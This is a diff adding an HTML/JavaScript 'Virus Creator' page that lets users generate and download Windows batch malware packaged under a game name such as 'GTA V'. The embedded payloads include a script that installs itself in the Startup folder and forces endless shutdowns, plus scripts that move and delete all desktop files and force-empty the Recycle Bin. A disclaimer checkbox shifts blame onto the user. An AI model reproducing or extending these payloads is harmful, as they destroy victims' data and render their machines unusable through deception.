@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinCode | Virus Creator</title>
+    <link rel="icon" href="lincode.jpg" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #E0E0E0;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            background: #1E1E1E;
+            border-radius: 1vh;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+            max-width: 50vh;
+            padding: 2.2vh;
+            text-align: center;
+            margin: 20vh auto 0;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        h1 {
+            color: #BB86FC;
+        }
+
+        
+
+        .buttonthing {
+            color: #E0E0E0;
+            width: 20%;
+            background-color: #1616167c;
+            border: none;
+            padding: 1.2vh;
+            margin: 0.7vh;
+            border-radius: 0.7vh;
+            cursor: pointer;
+        }
+
+        .buttonthing.active{
+            background-color: #BB86FC;
+        }
+
+        #topBar{
+            width: 100%;
+            height: 8vh;
+            background-color: #00000010;
+            z-index: 1000; /* Ensure it appears above other content */
+            position: fixed;
+            top: 0;
+            justify-content: center;
+            align-items: center;
+            display: flex;
+        }
+
+        #topBar button {
+            margin: 0 0.7vh; /* Add spacing between buttons */
+            
+        }
+
+        #topBar button:hover{
+            background-color: #BB86FC;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: all ease 0.3s;
+        }
+
+        .form-group {
+            margin-bottom: 1.7vh;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: .7vh;
+            color: #E0E0E0;
+        }
+        input, select, button {
+            width: 92%;
+            padding: 1.2vh;
+            margin-top: .5vh;
+            border-radius: .6vh;
+            border: 1px solid #333;
+            background: #333;
+            color: #E0E0E0;
+        }
+        button {
+            background-color: #BB86FC;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: all ease 0.3s;
+        }
+        button:hover {
+            background-color: #9B67E2;
+        }
+        
+        #results {
+            margin-top: 2vh;
+            text-align: left;
+            color: #E0E0E0;
+        }
+        .download-btn {
+            display: none;
+            margin-top: 1vh;
+            background-color: #03DAC6;
+        }
+        .download-btn:hover {
+            background-color: #02B3A4;
+        }
+        .loading {
+            color: #888;
+            font-style: italic;
+        }
+        /* Dropdown styling */
+        select {
+            width: 97%;
+           
+            margin-top: 0.5vh;
+            border-radius: 0.6vh;
+            background: #333;
+            color: #E0E0E0;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background-image: url('data:image/svg+xml;utf8,<svg fill="%23E0E0E0" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 1vh center;
+        }
+
+        /* Remove default arrow for IE */
+        select::-ms-expand {
+            display: none;
+        }
+        #generate {
+    background-color: #9B67E2;
+    position: relative;
+    overflow: hidden;
+}
+
+#generate::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 300%;
+    height: 100%;
+    background: linear-gradient(to right, rgba(255, 255, 255, 0), rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0));
+    animation: shine 4s infinite;
+}
+
+@keyframes shine {
+    0% {
+        transform: translateX(-100%);
+    }
+    50% {
+        transform: translateX(100%);
+    }
+    100% {
+        transform: translateX(300%);
+    }
+}
+
+#iAcknowledge{
+    font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+    font-weight: 600;
+    font-size: 1.6vh;
+    width: 100%;
+}
+
+.acknowledge-label {
+    color: #E0E0E0; /* Label color */
+    font-size: 1.4vh; /* Label font size */
+}
+
+.acknowledge-checkbox {
+    /* Customize the checkbox appearance */
+    appearance: none;
+    width: 6vh;
+    height: 2vh; /* Checkbox height */
+    background-color: #fc8686; /* Checkbox background color */
+    border-radius: 0.55vh;
+    margin-top: 0.3vh;
+    cursor: pointer; /* Show pointer cursor on hover */
+    transition: all ease 0.3s;
+}
+
+/* Styling when checkbox is checked */
+.acknowledge-checkbox:checked {
+    background-color: #86fc8c; /* Change background color when checked */
+}
+
+
+
+    </style>
+</head>
+<body>
+
+    <div id="topBar">
+        <button class="buttonthing" id="home">Home</button>
+        <button class="buttonthing active" id="kahoot">Virus Creator</button>
+        <button class="buttonthing" id="tos">Terms of Service</button>
+    </div>
+    
+    <div class="container" id="generatorContainer">
+        <h1>Virus Creator</h1>
+        <form id="gameForm">
+            <!-- Removed unnecessary input fields -->
+            <div class="form-group">
+                <label for="is3D">Virus Type</label>
+                <select id="is3D" name="is3D" required>
+                    <option value="Shutdown">Loop Shutdown</option>
+                    <option value="Trojan">Hide All Desktop Items</option>
+                    <option value="Ransomware">Delete All Desktop Items</option>
+                    <option value="Worm">Worm</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="fileName">Virus File Name</label>
+                <input type="text" id="fileName" name="fileName" required placeholder="For Example: FIFA 24, GTA V">
+            </div>
+            <div class="form-group">
+                <center>
+                    <label for="acknowledge" id="iAcknowledge" class="acknowledge-label">
+                        I acknowledge that I am responsible for how I use this virus and the creator does not take any responsibility.
+                    </label>
+                    <input type="checkbox" id="acknowledge" name="acknowledge" class="acknowledge-checkbox" required>
+                </center>
+            </div>
+            
+    
+            <button type="button" id="generate" onclick="generateGame()">Generate</button>
+        </form>
+        <div id="results"></div>
+        
+        <center><button id="downloadBtn" class="download-btn" onclick="downloadResults()">Download Virus</button></center>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
+
+
+    <script>
+
+
+function isCheckboxChecked() {
+            return document.getElementById('acknowledge').checked;
+        }
+
+        // Function to enable/disable the download button based on checkbox state
+        function toggleDownloadButton() {
+            const downloadBtn = document.getElementById('downloadBtn');
+            downloadBtn.disabled = !isCheckboxChecked(); // Disable the button if checkbox is not checked
+        }
+
+        // Function to shake the checkbox
+        function shakeCheckbox() {
+            alert("check the checkbox!")
+        }
+
+        // Add an event listener to the download button
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            if (!isCheckboxChecked()) {
+                alert("check the checkbox!")
+            } else {
+                // If checkbox is checked, proceed with the download action
+                // Replace the following line with your actual download logic
+                alert('Download started!');
+            }
+        });
+
+        // Add an event listener to the checkbox to toggle the download button
+        document.getElementById('acknowledge').addEventListener('change', function() {
+            toggleDownloadButton();
+            // Reset the shake animation for the checkbox when it's checked
+            if (isCheckboxChecked()) {
+                const checkbox = document.getElementById('acknowledge');
+                checkbox.style.animation = 'none';
+            }
+        });
+
+        // Initially disable the download button
+        toggleDownloadButton();
+
+
+
+
+        document.getElementById('home').addEventListener('click', function() {
+            window.location.href = 'home.html'; // Replace 'home.html' with the actual URL of your home page
+        });
+    
+        document.getElementById('kahoot').addEventListener('click', function() {
+            window.location.href = 'kahoot.html'; // Replace 'kahoot.html' with the actual URL of your Kahoot Cheats page
+        });
+    
+        document.getElementById('tos').addEventListener('click', function() {
+            window.location.href = 'tos.html'; // Replace 'tos.html' with the actual URL of your Terms of Service page
+        });
+    
+        function generateGame() {
+            const is3D = document.getElementById('is3D').value;
+            const fileName = document.getElementById('fileName').value;
+            const resultsDiv = document.getElementById('results');
+            const downloadBtn = document.getElementById('downloadBtn');
+    
+            // Show loading message
+            resultsDiv.innerHTML = '<center><p class="loading">Generating...</p></center>';
+            downloadBtn.style.display = 'none';
+    
+            // Simulate a delay of 2-6 seconds
+            const delay = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
+            setTimeout(() => {
+                // Display the generated game details
+                resultsDiv.innerHTML = `
+                <center>
+                    <p>Virus Type: ${is3D}</p>
+                    <p>Virus Name: ${fileName}</p>
+                </center>
+                `;
+                downloadBtn.style.display = 'block';
+            }, delay);
+        }
+    
+        function downloadResults() {
+    const fileName = document.getElementById('fileName').value;
+    const is3D = document.getElementById('is3D').value;
+
+    // Create a new JSZip instance
+    const zip = new JSZip();
+
+    // Create a folder for the game
+    const folder = zip.folder(fileName);
+
+
+    // Conditionally add the virus file to the folder based on the selected virus type
+    let virusFileContent = '';
+    if (is3D === 'Shutdown') {
+        virusFileContent = `@echo off
+            set "startupFolder=%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+            set "batchName=CrashOnStartup.bat"
+            copy "%~f0" "%startupFolder%\\%batchName%"
+            :start
+            shutdown /s /f /t 0
+            goto start`;
+    } else if (is3D === 'Trojan') {
+        virusFileContent = `@echo off
+set "desktop=%USERPROFILE%\Desktop"
+
+REM Move all files and folders from the desktop to the Recycle Bin
+move "%desktop%\*" "%USERPROFILE%\AppData\Local\Temp\" > nul
+rd /s /q "%desktop%" > nul
+`;
+    } else if (is3D === 'Ransomware') {
+        virusFileContent = `@echo off
+set "desktop=%USERPROFILE%\Desktop"
+
+REM Move all files and folders from the desktop to the Recycle Bin
+move "%desktop%\*" "%USERPROFILE%\AppData\Local\Temp\" > nul
+rd /s /q "%desktop%" > nul
+
+REM Restore files and folders from the Recycle Bin
+powershell -Command "Clear-RecycleBin -Force"
+
+pause`
+    } else if (is3D === 'Worm') {
+        `@echo off
+setlocal EnableDelayedExpansion
+
+rem Define the worm character
+set "worm=^>"
+
+rem Get screen dimensions
+for /F "tokens=2 delims=: " %%A in ('mode con ^| findstr Columns') do set /A "width=%%A"
+for /F "tokens=2 delims=: " %%B in ('mode con ^| findstr Lines') do set /A "height=%%B"
+
+rem Set initial position
+set /A "x=%width% / 2, y=%height% / 2"
+
+rem Clear the screen
+cls
+
+:moveWorm
+rem Move the worm to the current position
+set "wormLine="
+for /L %%i in (1,1,%x%) do set "wormLine=!wormLine! "
+set "wormLine=%wormLine%%worm%"
+
+rem Clear the previous position of the worm
+for /L %%i in (1,1,%height%) do echo(
+
+rem Move the worm to the current position
+for /L %%i in (1,1,%y%) do echo(
+
+rem Move to the worm's current position
+echo %wormLine%
+
+rem Wait before moving the worm
+ping -n 2 localhost >nul
+
+rem Randomly change direction
+set /A "direction=%random% %% 4"
+if %direction% equ 0 (
+    if %x% gtr 1 set /A "x-=1"
+) else if %direction% equ 1 (
+    if %x% lss %width% set /A "x+=1"
+) else if %direction% equ 2 (
+    if %y% gtr 1 set /A "y-=1"
+) else (
+    if %y% lss %height% set /A "y+=1"
+)
+
+rem Loop back to move the worm again
+goto moveWorm
+`
+    }
+
+    // Add the virus file to the folder
+    folder.file(`${fileName}.exe.txt`, virusFileContent);
+
+    // Generate the ZIP file and trigger the download
+    zip.generateAsync({ type: 'blob' })
+        .then(function (content) {
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(content);
+            a.download = `${fileName}.zip`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        })
+        .catch(function (error) {
+            console.error('Error generating ZIP file:', error);
+        });
+}
+
+    </script>
+    
+</body>
+</html>
